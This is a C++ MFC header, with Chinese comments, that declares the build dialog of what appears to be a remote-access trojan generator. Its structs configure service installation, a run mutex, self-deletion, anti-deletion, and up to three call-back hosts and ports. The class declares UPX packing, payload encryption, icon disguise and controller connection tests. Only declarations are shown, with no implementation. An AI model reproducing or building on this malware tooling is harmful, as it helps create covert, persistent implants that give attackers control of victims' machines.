#if !defined(AFX_BUILDSERVER1_H__046462A8_9C0F_4DA6_BE21_CF54C4A2165A__INCLUDED_)
#define AFX_BUILDSERVER1_H__046462A8_9C0F_4DA6_BE21_CF54C4A2165A__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// BuildServer1.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// BuildServer dialog

static struct SERVERINFO
{
	CHAR ReleacsName[100];   //安装服务名称
	CHAR ReleasePath[100];   //安装途径
	CHAR ReleaseName[50];    //安装名称
	CHAR szGroup[100];       //上线分组
	CHAR Mexi[100];          //运行互斥
	BOOL Dele_te;            //安装自删除
	BOOL Dele_zc;            //安装运行
	BOOL Dele_zd;            //安装增大
	BOOL Dele_fs;            //占坑防删除安装
	BOOL Dele_Kzj;           //K终结者
}m_ServiceInfo;


static struct ONLINEINFO
{
	CHAR DNS1[100];     //上线DNS 1
	CHAR DNS2[100];     //上线DNS 1
	CHAR DNS3[100];     //上线DNS 1
	WORD Port1;         //上线端口 1
	WORD Port2;         //上线端口 2
	WORD Port3;         //上线端口 3
	CHAR szMark[100];   //服务版本
}m_OnlineInfo;

////////////////////////////////////////////////////////////////////
struct ICONDIRENTRY1
{
    BYTE bWidth;
    BYTE bHeight;
    BYTE bColorCount;
    BYTE bReserved;
    WORD wPlanes;
    WORD wBitCount;
    DWORD dwBytesInRes;
    DWORD dwImageOffset;
};


struct ICONDIR1
{
    WORD idReserved;
    WORD idType;
    WORD idCount;
    //ICONDIRENTRY idEntries;
};


struct GRPICONDIRENTRY1
{
    BYTE bWidth;
    BYTE bHeight;
    BYTE bColorCount;
    BYTE bReserved;
    WORD wPlanes;
    WORD wBitCount;
    DWORD dwBytesInRes;
    WORD nID;
};

struct GRPICONDIR1
{
    WORD idReserved;
    WORD idType;
    WORD idCount;
    GRPICONDIRENTRY1 idEntries;
};


class BuildServer : public CDialog
{
// Construction
public:
	BOOL IsFileExist(LPCTSTR strFileName);
	void CompressUpx(CString inpath);
	BuildServer(CWnd* pParent = NULL);   // standard constructor
//	BuildServer(CWnd* pParent /*=NULL*/): CDialog(BuildServer::IDD, pParent)
//    void OnChangeConfig();
	static	DWORD WINAPI TestMaster1(LPVOID lparam);
	static	DWORD WINAPI TestMaster2(LPVOID lparam);
	static	DWORD WINAPI TestMaster3(LPVOID lparam);
//	virtual BOOL qqonline(CString str);
// Dialog Data
	//{{AFX_DATA(CBuildServer)
	enum { IDD = IDD_BUILD_SERVER };
	CButton	m_testBtn1;
	CButton	m_testBtn2;
	CButton	m_testBtn3;
	CComboBox	m_control_host;
	CComboBox	m_group_name;
	CComboBox	m_releasepath;
	CString	m_ServiceName;
//	CString	m_ServiceDisplayName;
	CString	m_strVersion;
//	CString	m_ServiceDescription;
//	CString	m_url;
	CString	m_dllname;
	CString	m_exemeux;
	CStatic	m_Ico;
//	CString	m_encode;
//	BOOL	m_enable_http;
	UINT	m_remote_port1;
	UINT	m_remote_port2;
	UINT	m_remote_port3;
//	CString	m_pass;
	CString	m_remote_host1;
	CString	m_remote_host2;
	CString	m_remote_host3;
	CString	m_remote_name;
	CString	m_remote_path;
	BOOL	m_delrtd;
	BOOL	m_zraz;
	BOOL	m_azzd;
	BOOL	m_zkfsms;
	BOOL	m_zkfkzj;
//	BOOL	m_md5;
	BOOL	m_upx; 
	BOOL	m_gdtj;
	BOOL	m_meux;
//	BOOL	m_zd;
	//}}AFX_DATA


// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CBuildServer)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:

	// Generated message map functions
	//{{AFX_MSG(CBuildServer)
	afx_msg void OnTestMaster1();
	afx_msg void OnTestMaster2();
	afx_msg void OnTestMaster3();
//	afx_msg void OnEnableHttp();
	virtual BOOL OnInitDialog();
	afx_msg void OnChangeRemotePort();
	afx_msg void OnBuild();
	afx_msg void OnExit();
	afx_msg void Onzraz();
	afx_msg void Ongdtj();
	afx_msg void Onmeux();
	afx_msg void OnLButtonDown(UINT nFlags, CPoint point);
	afx_msg void OnSelchangeRemoteHost();
	afx_msg void OnEditchangeRemoteHost();
	afx_msg void OnLButtonDblClk(UINT nFlags, CPoint point);
	afx_msg BOOL OnSetCursor(CWnd* pWnd, UINT nHitTest, UINT message);
	afx_msg void OnRandom();
	afx_msg BOOL CreateServer(SERVERINFO *lpData,ONLINEINFO *lpOnline,LPSTR szPath);
//	afx_msg CHAR GetRandChar(BOOL  Capital,int i);
//	afx_msg int memfind(const char *mem, const char *str, int sizem, int sizes);
	afx_msg VOID MyEncryptFunctionForServer(LPSTR szData,WORD Size);
	afx_msg void OnSelectIco();


	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};



//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_BUILDSERVER1_H__046462A8_9C0F_4DA6_BE21_CF54C4A2165A__INCLUDED_)
